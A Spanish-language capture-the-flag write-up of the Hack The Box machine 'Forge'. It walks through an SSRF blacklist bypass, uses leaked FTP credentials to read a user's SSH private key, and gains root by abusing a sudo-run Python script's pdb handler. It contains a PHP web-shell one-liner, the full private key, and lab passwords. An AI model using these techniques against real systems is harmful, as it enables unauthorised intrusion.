---
layout: single
title: Forge - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Forge de la plataforma de Hackthebox donde vamos aprovecharnos de un SSRF para poder enumerar la maquina mediante esta vulnerabilidad web para poder asi descubrir un nuevo subdominio y conseguir la id_rsa de un usuario de la maquina para poder conectarnos por SSH todo lo conseguiremos mediante el SSRF para la escalada de privilegios nos aprovecharemos de un privilegio que tenemos a nivel de sudoers con un script de Python3 el cual gracias al el nos convertiremos en root ya que en el propio script ya nos dicen que debemos de hacer para ser root"
date: 2023-06-10
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-forge/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Server Side Request Forgery (SSRF)
  - Bypassing URL Blacklist
  - Abusing Sudoers Privilege
  - Subdomain Enumeration
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.111
PING 10.10.11.111 (10.10.11.111) 56(84) bytes of data.
64 bytes from 10.10.11.111: icmp_seq=1 ttl=63 time=112 ms

--- 10.10.11.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.615/111.615/111.615/0.000 ms
❯ whichSystem.py 10.10.11.111

10.10.11.111 (ttl -> 63): Linux

```

## PortScan

```bash
❯ catn targeted
# Nmap 7.93 scan initiated Sat Jun 10 13:24:26 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f78656629e4876b3cccb43ad25720ac (RSA)
|   256 79df3af1fe874a57b0fd4ed054c628d9 (ECDSA)
|_  256 b05811406d8cbdc572aa8308c551fb33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Bueno de primeras vemos que tenemos un subdominio que es `forge.htb` así que vamos agregarlo al **/etc/hosts** 

```bash
❯ echo "10.10.11.111 forge.htb" | sudo tee -a /etc/hosts
10.10.11.111 forge.htb
❯ ping -c 1 forge.htb
PING forge.htb (10.10.11.111) 56(84) bytes of data.
64 bytes from forge.htb (10.10.11.111): icmp_seq=1 ttl=63 time=110 ms

--- forge.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.783/109.783/109.783/0.000 ms

```

También pudimos darnos cuenta gracias a esto en caso de que **Nmap** no lo reportara

```bash
❯ curl -s -I http://10.10.11.111
HTTP/1.1 302 Found
Date: Sat, 10 Jun 2023 19:29:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://forge.htb
Content-Type: text/html; charset=iso-8859-1
```

Ahora con la herramienta **whatweb** vamos a ver las tecnologías que corre el servicio **web**

```ruby
❯ whatweb http://forge.htb
http://forge.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.111], Title[Gallery]
```

Esta es la pagina web

![](/assets/images/htb-writeup-forge/web1.png)

Si nos vamos a la ruta **upload** vemos que tenemos un campo donde podemos subir archivos

![](/assets/images/htb-writeup-forge/web2.png)

Hay una ruta donde están alojadas las imágenes que se ven en la pagina web si nos descargamos 1 no encontramos gran cosa

![](/assets/images/htb-writeup-forge/web3.png)

```bash
❯ exiftool image1.jpg
ExifTool Version Number         : 12.16
File Name                       : image1.jpg
Directory                       : .
File Size                       : 562 KiB
File Modification Date/Time     : 2021:01:13 02:48:49-06:00
File Access Date/Time           : 2023:06:10 13:33:53-06:00
File Inode Change Date/Time     : 2023:06:10 13:33:53-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1920
Image Height                    : 1081
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1081
Megapixels                      : 2.1
```

Vamos a aplicar **Fuzzing** para ver si encontramos algo aparte de lo de **upload**, el directorio **uploads** tiene un código de estado **301** el cual no podemos ver quiero suponer que hay es donde se guarden los archivos que subimos 

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://forge.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://forge.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        4l       24w      224c http://forge.htb/uploads
301        9l       28w      307c http://forge.htb/static
301        9l       28w      311c http://forge.htb/static/css
301        9l       28w      310c http://forge.htb/static/js
```

Bueno si regresamos ala parte donde podemos subir archivos vemos que tenemos 2 casos subir un archivo local o subir algo indicándole una **url**

![](/assets/images/htb-writeup-forge/web4.png)

Vamos a hacer una prueba subiendo una imagen cualquiera primero en mi caso voy a subir esta puedes usar la que quieras

![](/assets/images/htb-writeup-forge/web5.png)

Una vez subimos la imagen y le damos en **submit** nos da una `url`

![](/assets/images/htb-writeup-forge/web6.png)

Si lo abrimos en otro pestaña vemos que si guardo la imagen

![](/assets/images/htb-writeup-forge/web7.png)

Ahora lo que vamos a hacer es subir algo desde una `url` con **Python3** vamos establecer un servidor **http** por cualquier puerto para ver si nos llega alguna petición le vamos a indicar un archivo el cual no exista primero para ver que pasa

![](/assets/images/htb-writeup-forge/web8.png)

Una vez le damos en **submit** vemos que básicamente si nos llega una petición por el método **GET**

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.111 - - [10/Jun/2023 13:48:44] code 404, message File not found
10.10.11.111 - - [10/Jun/2023 13:48:44] "GET /hola HTTP/1.1" 404 -
```

Si abrimos el link que nos genera en una pestaña aparte vemos lo siguiente

![](/assets/images/htb-writeup-forge/web9.png)

Vamos a subir ahora un archivo con extensión **.php** para ver si nos deja

```bash
❯ catn rev.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Pues bueno nos deja pero aun así no pasa nada ya que quiero pensar que lo que esta esperando es una imagen 

![](/assets/images/htb-writeup-forge/web10.png)

Bueno probé cambiando la extensión pero nada, bueno se me ocurrió una idea de hacer un **index.html** y meter un oneliner en bash para que me enviara una reverse shell pero no nos serviría de nada por que ganaríamos acceso a nuestra propia maquina ya que no se pueden concatenar comandos y ademas solo nos lista el contenido 

![](/assets/images/htb-writeup-forge/web11.png)

## Server-Side Request Forgery (SSRF)

En un ataque de **SSRF**, el atacante utiliza una entrada del usuario, como una **URL** o un campo de formulario, para enviar una solicitud **HTTP** a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso

Bueno después de estar probando con mas extensiones como nos esta haciendo una petición y ademas podemos ver el contenido del archivo por que no decirle que se haga una petición la maquina así misma 

Bueno si lo hacemos ya descubrimos que están usando una **blacklist**

![](/assets/images/htb-writeup-forge/web12.png)

Pero bueno también lo que podemos hacer es representar la **IP** **127.0.0.1** a **hexadecimal** 

Podemos basarnos en esto

```bash
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(127)
'0x7f'
>>> 
```

Aun así funciona

```bash
❯ ping -c 1 0x7f000001
PING 0x7f000001 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.094 ms

--- 0x7f000001 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.094/0.094/0.094/0.000 ms
```

Si le decimos que nos muestre las cabeceras de **SSH** se puede es como hacer esto 

```bash
❯ nc 10.10.11.111 22
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
```

![](/assets/images/htb-writeup-forge/web13.png)

Funciona pero nos dice que hubo un error

![](/assets/images/htb-writeup-forge/web14.png)

Pues bueno pudimos hacer eso si pruebas hacerlo al subdominio veras que te lo detecta con **blacklist** pero bueno puedes poner algo `http://FoRGe.HtB` y funciona

```bash
❯ curl -s -X GET "http://forge.htb/uploads/zGvwMywOUZMrxgsxp99x" | html2text

****** Gallery ******
****** Upload_an_image ******


   [/static/images/    [/static/images/image2.jpg] [/static/images/image3.jpg]
      image1.jpg]
   [/static/images/    [/static/images/image5.jpg] [/static/images/image6.jpg]
      image4.jpg]
   [/static/images/    [/static/images/image8.jpg] [/static/images/image9.jpg]
      image7.jpg]
```

Lo que también podemos hacer es hacer un escaneo para ver si hay algún otro **subdominio** en la maquina vamos a usar **Gobuster**

Y bueno encontramos una vamos a añadirlo al **/etc/hosts**

```bash
❯ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/10 14:36:19 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]
```

```bash
❯ ping -c 1 admin.forge.htb
PING forge.htb (10.10.11.111) 56(84) bytes of data.
64 bytes from forge.htb (10.10.11.111): icmp_seq=1 ttl=63 time=260 ms

--- forge.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 260.088/260.088/260.088/0.000 ms

```

Si vemos que es lo que hay desde la pagina web encontramos esto 

![](/assets/images/htb-writeup-forge/web15.png)

Pero bueno como en el **SSRF** podemos hacer peticiones que la propia maquina se las hace lo que podemos hacer es tratar de hacer un pequeño **bypass** para que la maquina se haga una petición así misma y nos muestre el contenido de ese subdominio 

Podemos hacer esto `http://AdMin.FoRGe.Htb`

Y funciona nos da el link y este es el contenido 

```bash
❯ curl -s -X GET "http://forge.htb/uploads/BMYOSygroZVxTzNI47aS"
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Bueno si analizamos ese código vemos que hay etiquetas de las cuales de redirigen por ejemplo **Portal home** te redirige ala raíz entonces lo que podemos hacer es listar el contenido de esto `/announcements`

`http://AdMin.FoRGe.Htb/announcements`

Una vez ponemos la `url` vemos que funciona y si listamos el contenido encontramos credenciales

```bash
❯ curl -s -X GET "http://forge.htb/uploads/xgGBuVJb4d1Xibae1ngq"
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

Tenemos estas credenciales `user:heightofsecurity123!`

Bueno también nos dicen sobre **FTP** pero como tal **Nmap** no lo reporto como abierto así que lo que podemos hacer es aprovecharnos del **SSRF** para ver si esta abierto de la siguiente forma `http://0x7f000001:21`

Pero bueno quiero suponer que solo esta abierto internamente es por eso que **Nmap** no lo reporto como abierto pero bueno

![](/assets/images/htb-writeup-forge/web16.png)

Si leemos esta linea ya es interesante nos están diciendo que para la ruta `/upload` podemos concatenar `?u=<url>` como nos decían que se estaba usando **ftp** esta abierto internamente y nos están compartiendo credenciales lo que podemos hacer es conectarnos atra vez del campo de la `url`

```bash
 * The /upload endpoint has been configured for easy scripting of uploads,
      and for uploading an image, one can simply pass a url with ?u=<url>.
```

Podemos hacer esto para burlar el **blacklist** `http://AdMiN.fOrGE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB` 

Y con esto ya podemos ver la `user.txt`

```bash
❯ curl -s -X GET "http://forge.htb/uploads/XEo1XlQf1qREkA1esPAi"
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Jun 10 19:16 user.txt
```

## User.txt

Pues bueno gracias a la vulnerabilidad **SSRF** y a todo esto podemos listar la **user.txt**

`http://AdMiN.fOrGE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt`

Y hay vemos la primer flag

```bash
❯ curl -s -X GET "http://forge.htb/uploads/knrJZ3lBEchwWQ06Qres"
564ac6050026c6ca13de33c622b689a4
```

## Shell as user 

Como la `user.txt` esta en el directorio personal del usuario y podemos listar contenido por que nos estamos autenticando es ver su `id_rsa` para conectarnos por **SSH** 

`http://AdMiN.fOrGE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa`

Una vez lo subimos vemos que funciona 

```bash
❯ curl -s -X GET "http://forge.htb/uploads/wqnIT8xF7oTJHQtoqZNH"
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
```

Ahora nos conectamos por **SSH** como **user**

```bash
❯ ssh -i id_rsa user@10.10.11.111
The authenticity of host '10.10.11.111 (10.10.11.111)' can't be established.
ECDSA key fingerprint is SHA256:e/qp97tB7zm4r/sMgxwxPixH0d4YFnuB6uKn1GP5GTw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.111' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 10 Jun 2023 09:15:19 PM UTC

  System load:           0.16
  Usage of /:            43.9% of 6.82GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.111
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f43c


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ 
```

## Escalada de privilegios

Ahora si vemos nos tenemos que convertir directamente en el usuario **root** ya que no hay mas usuarios que contengan una **bash** a nivel de sistema

```bash
user@forge:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
user:x:1000:1000:NoobHacker:/home/user:/bin/bash
user@forge:~$
```

Si hacemos un **sudo -l** vemos lo siguiente podemos correr como cualquier usuario sin proporcionar contraseña **/opt/remote-manage.py** usando **python3**

Este es el contenido del archivo

```bash
user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
user@forge:~$ 
```

Si revisamos en el script vemos que si se hace una excepción se ejecuta el **pdb***, ademas esta abriendo un `socket` por un puerto aleatorio es por eso que esta usando `random` 

Esto es lo que hace si lo corremos 

```bash
user@forge:/$ sudo /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:21726
```

Lo que esta haciendo es esperando una **conexion** y cuando te conectas pide una contraseña y aplica una comparativa con la contraseña que espera pero si revisamos nos la están dando `secretadminpassword` 

Y bueno pues sabiendo esto lo que vamos a hacer es conectarnos por **SSH** otra vez usar **netcat** para conectarnos a ese **Puerto** e introducir la contraseña 

```bash
❯ ssh -i id_rsa user@10.10.11.111
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 10 Jun 2023 09:30:09 PM UTC

  System load:           0.04
  Usage of /:            43.9% of 6.82GB
  Memory usage:          36%
  Swap usage:            0%
  Processes:             225
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.111
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f43c


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jun 10 21:29:20 2023 from 10.10.14.9
user@forge:~$ export TERM=xterm
user@forge:~$ nc localhost 21726
Enter the secret passsword:
```

Ahora introducimos la contraseña y listo `secretadminpassword`, nos dan las siguientes opciones

```bash
user@forge:~$ nc localhost 21726
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit

```

Bueno el programa esta esperando un dato de tipo entero si queremos llegar al **pdb** lo que podemos hacer es introducir una cadena

```bash
user@forge:~$ nc localhost 21726
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
adslkasdjklsjldslj
```

Si lo hacemos en la otra consola llegamos al **breakpoint**

```bash
user@forge:/$ sudo /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:21726
invalid literal for int() with base 10: b'adslkasdjklsjldslj'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) 
```

Estamos en esta linea

```bash
(Pdb) l
 34  	           elif option == 4:
 35  	               clientsock.send(b'Bye\n')
 36  	               break
 37  	except Exception as e:
 38  	   print(e)
 39  ->	   pdb.post_mortem(e.__traceback__)
 40  	finally:
 41  	   quit()
[EOF]
(Pdb) 
```

Podemos importar librerías y directamente ejecutar comandos

```bash
(Pdb) import os
(Pdb) os.system("whoami")
root
0
(Pdb) 
```

Y pues ahora le indicamos que queremos una **Bash**

```bash
(Pdb) os.system("bash")
root@forge:/# whoami
root
root@forge:/# 
```

## Root flag

```bash
root@forge:~# cat root.txt 
e916cc17fd4a3fb9a1ed909ff595cacc
root@forge:~# 
```
